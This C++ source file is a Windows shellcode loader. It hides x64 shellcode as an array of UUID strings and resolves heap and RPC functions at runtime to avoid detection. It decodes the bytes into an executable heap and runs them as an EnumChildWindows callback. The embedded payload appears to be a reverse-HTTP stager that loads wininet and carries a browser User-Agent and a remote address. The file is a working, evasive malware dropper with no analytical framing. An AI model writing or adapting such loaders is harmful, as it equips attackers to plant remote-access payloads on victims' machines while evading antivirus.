#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#pragma comment(lib, "Rpcrt4.lib")


const char* uuids[] =
{
    "e48348fc-e8f0-00c8-0000-415141505251", "d2314856-4865-528b-6048-8b5218488b52", "728b4820-4850-b70f-4a4a-4d31c94831c0", "7c613cac-2c02-4120-c1c9-0d4101c1e2ed", "48514152-528b-8b20-423c-4801d0668178", "75020b18-8b72-8880-0000-004885c07467", "50d00148-488b-4418-8b40-204901d0e356", "41c9ff48-348b-4888-01d6-4d31c94831c0", "c9c141ac-410d-c101-38e0-75f14c034c24", "d1394508-d875-4458-8b40-244901d06641", "44480c8b-408b-491c-01d0-418b04884801", "415841d0-5e58-5a59-4158-4159415a4883", "524120ec-e0ff-4158-595a-488b12e94fff", "6a5dffff-4900-77be-696e-696e65740041", "e6894956-894c-41f1-ba4c-772607ffd548", "3148c931-4dd2-c031-4d31-c94150415041", "79563aba-ffa7-e9d5-9300-00005a4889c1", "01bbb841-0000-314d-c941-5141516a0341", "57ba4151-9f89-ffc6-d5eb-795b4889c148", "8949d231-4dd8-c931-5268-0032c0845252", "55ebba41-3b2e-d5ff-4889-c64883c3506a", "89485f0a-baf1-001f-0000-6a0068803300", "e0894900-b941-0004-0000-41ba75469e86", "8948d5ff-48f1-da89-49c7-c0ffffffff4d", "5252c931-ba41-062d-187b-ffd585c00f85", "0000019d-ff48-0fcf-848c-010000ebb3e9", "000001e4-82e8-ffff-ff2f-4c70584900df", "c70b55e6-190b-b44d-748f-06898a62178f", "21c88ac2-1ba0-3f2e-f9cf-4b3272e2e974", "f5326c2d-0ed2-b1ca-8a0a-c6f2f8ece05c", "62865e80-8d24-100a-51d6-daaf84ce8a8a", "1878faa7-bc97-50b0-0055-7365722d4167", "3a746e65-4d20-7a6f-696c-6c612f352e30", "6f632820-706d-7461-6962-6c653b204d53", "31204549-2e30-3b30-2057-696e646f7773", "20544e20-2e36-3b32-2057-4f5736343b20", "64697254-6e65-2f74-362e-303b204d4147", "29534a57-0a0d-ce00-758d-fb7ddbd6051b", "fa45c5cb-217e-e55f-c30b-88f322f42bf7", "6e5cfa55-debd-9931-bbef-1a1eeeb93ab1", "46b1bc56-8056-f1b3-7b88-93a2767a5995", "2d06674a-36cb-51b2-8583-b8fc5957e85b", "1fa25721-5fc0-1003-e185-04b060e6e7a7", "40325298-4744-61db-b711-425af22006b7", "ed269ac6-9a5e-87fd-9e73-66a9e9f595c7", "2d4d6374-13ab-f500-e680-00f469c855de", "2c779de6-1cb7-22af-e9a7-fc1c37e7e9d6", "30fe8ed1-21ae-dd9f-e9dc-62bcfdf26893", "e14c61ee-0e39-c60c-37a3-e3a427b172ec", "9cfbf3b0-7979-60f5-7773-cdc573610109", "7075c3b5-b1a9-a24e-0041-bef0b5a256ff", "c93148d5-00ba-4000-0041-b80010000041", "000040b9-4100-58ba-a453-e5ffd5489353", "e7894853-8948-48f1-89da-41b800200000", "41f98949-12ba-8996-e2ff-d54883c42085", "66b674c0-078b-0148-c385-c075d7585858", "00000548-0000-c350-e87f-fdffff312e31", "30382e35-312e-3230-0049-9602d2000000"
};


typedef HANDLE(WINAPI* ImportHeapCreate)(
    _In_ DWORD flOptions,
    _In_ SIZE_T dwInitialSize,
    _In_ SIZE_T dwMaximumSize
    );

typedef LPVOID(WINAPI* ImportHeapAlloc)(
    _In_ HANDLE hHeap,
    _In_ DWORD dwFlags,
    _In_ SIZE_T dwBytes
    );

typedef RPC_STATUS(RPC_ENTRY* ImportUuidFromStringA)(
    _In_opt_ RPC_CSTR StringUuid,
    _Out_ UUID __RPC_FAR* Uuid
    );


int main()
{
    ImportHeapCreate MyHeapCreate = (ImportHeapCreate)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "HeapCreate");
    ImportHeapAlloc MyHeapAlloc = (ImportHeapAlloc)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "HeapAlloc");

    HMODULE hModule = LoadLibraryA("RPCRT4.dll");
    ImportUuidFromStringA MyUuidFromStringA = (ImportUuidFromStringA)GetProcAddress(hModule, "UuidFromStringA");

    HANDLE hc = MyHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = MyHeapAlloc(hc, 0, 0x100000);

    DWORD_PTR hptr = (DWORD_PTR)ha;
    int elems = sizeof(uuids) / sizeof(uuids[0]);

    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = MyUuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) {
            CloseHandle(ha);
            return -1;
        }
        hptr += 16;
    }

    EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
    CloseHandle(ha);
    return 0;
}